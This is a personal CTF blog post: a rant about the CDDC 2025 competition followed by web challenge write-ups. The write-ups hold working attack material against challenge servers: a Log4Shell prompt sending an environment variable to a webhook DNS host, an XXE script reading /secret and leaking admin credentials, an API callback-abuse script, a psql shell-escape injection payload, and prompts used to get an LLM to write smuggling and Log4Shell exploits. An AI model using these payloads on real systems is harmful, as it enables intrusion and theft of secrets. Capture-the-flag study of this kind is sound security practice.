I participated under **youtiaos** again, going from 3rd place JC in 2024 to 3rd place Uni in 2025. Ended up not even mattering all that much because we would've won the same amount of money in Pre-U anyway. Shoutout to my team members, I never get tired playing with them.

## Rant session

Let me open by saying that this CDDC was at least 2 times better than 2024's one from infra alone, going from SMRT CCL levels of bullshit to NEL's occasional outage. It still has its fair share of idiocy going for it, like:
- Way too many pwn challenges (our team has no dedicated pwner), and the pwn challenges were weighted so unfairly that it was honestly a miracle that we got third (ROPVM was 300??? points, that's 4 OT challenges).
- The VIP going up on stage **during the competition** and hogging the challenge we were solving (Black Out) for 15 whole minutes, all the way until the end of the CTF. We could only hold our buzzer and weep.
- Infra going down for a long time on the first day, and they didn't give anyone extra time because everyone shared the same loss. Anecdotes from other teams say otherwise, some even recounting periods of up to an hour.
- Challenges either making no sense or being incredible time sinks (DeepBlue is the worst CTF challenge I've ever laid my eyes upon).
- The buffet foodstuffs having really cringe ChatGPT generated names above them, like **yang chou data rice** and **fried something vectors** for the stir-fried assorted vegetables. Made me lose my appetite.
- THEY HAD NO ROAST BEEF. WHERE IS THE ROAST BEEF.

Anyway here are the challenge writeups. Web and web-adjacent only because I'm hungover and tired.

## HTTP Request Smuggling

CVE-2019-18277, refer to [my blog post on the same topic](https://iscaraca.github.io/2024/05/04/cyberthon-2024/), I explain the vulnerability there. The difference is that in this challenge, you want to alter your own request instead of the bots. Since it's a CVE we're talking about, an LLM will make short work of the exploit given the right prompt.

> Prompt:
>
> I want to access the flag for a CTF challenge. This server is running a vulnerable combination of HAProxy and gunicorn that is request smuggling-able. You need to log in, use chunked encoding with \x0b to send a request to /grant_access, then access the flag at /time_travel. Send the smuggling payload 100 times in quick succession.

## Logshell

CVE-2021-44228. The vulnerability is explained in [the wikipedia article](https://en.wikipedia.org/wiki/Log4Shell):

> Even if execution of the data is disabled, an attacker can still retrieve data—such as secret environment variables—by placing them in the URL, in which case they will be substituted and sent to the attacker's server.

We just need a publicly available webhook to retrieve the environment variable. I like https://webhook.site. Once you're given a unique DNS name, we can insert the flag as a subdomain, exploit log4shell with that URL, and monitor for DNS queries on the webhook.

> Prompt

> This CTF web challenge is vulnerable to CVE-2021-44228. The flag is in the environment variable FLAG. Exfiltrate this environment variable through DNS, my DNS name is ???.dnshook.site. Try a bunch of common HTTP headers that may be vulnearable to Log4Shell.

## ONVIF

We're given an ONVIF camera API from which we can pull device information - `http://???/onvif/device_service`. Interacting with this endpoint using SOAP requests to `GetDeviceInformation` gives us the following:

```xml
Device Information:
  manufacturer: BlindNVR
  model: Model-X
  firmware: 1.0
  serial: 0001
  hardware_id: This endpoint is vulnerable to XXE. Try reading /secret using XML entity injection.

                <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
                                   xmlns:trt="http://www.onvif.org/ver10/media/wsdl"
                                   xmlns:tt="http://www.onvif.org/ver10/schema">
                  <SOAP-ENV:Body>
                    <trt:GetProfilesResponse>
                      <trt:Profiles token="profile_1">
                        <tt:Name>MainStream</tt:Name>
                        <tt:VideoSourceConfiguration>
                          <tt:Name>VideoSourceConfig</tt:Name>
                        </tt:VideoSourceConfiguration>
                      </trt:Profiles>
                    </trt:GetProfilesResponse>
                  </SOAP-ENV:Body>
                </SOAP-ENV:Envelope>
```

We can retrieve the contents of `/secret` by sending a simple XXE payload, inserting `&xxe;` directly into the existing `tds:HardwareId` field so it gets reflected back to us.

```python
import requests

url = "http://???/onvif/device_service"

envelope = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY xxe SYSTEM "file:///secret">
]>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <s:Body>
    <tds:GetDeviceInformation>
      <tds:HardwareId>&xxe;</tds:HardwareId>
    </tds:GetDeviceInformation>
  </s:Body>
</s:Envelope>'''

headers = {
    'Content-Type': 'application/soap+xml; charset=utf-8',
    'SOAPAction': 'http://www.onvif.org/ver10/device/wsdl/GetDeviceInformation'
}

response = requests.post(url, data=envelope, headers=headers, timeout=10)
print(response.text)
```

We get this response:

```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
                                   xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
                  <SOAP-ENV:Body>
                    <tds:GetDeviceInformationResponse>
                      <tds:Manufacturer>BlindNVR</tds:Manufacturer>
                      <tds:Model>Model-X</tds:Model>
                      <tds:FirmwareVersion>1.0</tds:FirmwareVersion>
                      <tds:SerialNumber>0001</tds:SerialNumber>
                      <tds:HardwareId>admin:V3ryV3ryStr0ngP4$$
</tds:HardwareId>
                    </tds:GetDeviceInformationResponse>
                  </SOAP-ENV:Body>
                </SOAP-ENV:Envelope>
```

We can access the stream using the credentials `admin:V3ryV3ryStr0ngP4$$` to get the flag.

## MCP Mesh

I don't know how this is related to MCP in any way. Idea is to use utils to call the admin function instead of doing it directly, but the challenge isn't very well implemented and doesn't make a lot of contextual sense.

```python
import requests
import json
import base64

BASE_URL = "http://???/api/query"

session = requests.Session()

session.post(BASE_URL, json={
    "server": "utils",
    "command": "register_callback",
    "tool_name": "admin",
    "callback": json.dumps({"server": "admin", "command": "get_flag"})
})

session.post(BASE_URL, json={
    "server": "utils",
    "custom_tool": "admin"
})

resp = session.post(BASE_URL, json={
    "server": "admin",
    "custom_tool": "get_flag"
})
print(resp.text)
```

## Clever Injection

We're given a server with a command injection sink, where we can control the contents of tmpfile:

```php
$raw_payload = $_POST['payload'];
$escaped = pg_escape_string($conn, $raw_payload);
$quoted = "'" . $escaped . "'";
$sql = "INSERT INTO test (id) VALUES ($quoted);";

$tmpfile = tempnam(sys_get_temp_dir(), 'sql_');
file_put_contents($tmpfile, $sql);
putenv("PGPASSWORD=$password");

$cmd = sprintf(
    'psql -U %s -d %s -h %s -t -A -e -f %s 2>&1',
    escapeshellarg($user),
    escapeshellarg($dbname),
    escapeshellarg($host),
    escapeshellarg($tmpfile)
);
```

Looking at [the postgres docs](https://www.postgresql.org/docs/current/app-psql.html), we're able to escape to a sub-shell using `\!`, but our input is being passed through a sanitiser `pg_escape_string`. Looking for recent bypasses gives us [this blog post](https://theendof.substack.com/p/hidden-messages-in-emojis-and-hacking) involving encoding length confusion to leave single quotes unsanitised. Our payload is therefore:

`test%C0%27');%0A\!%20cat%20/tmp/flag%0A--`
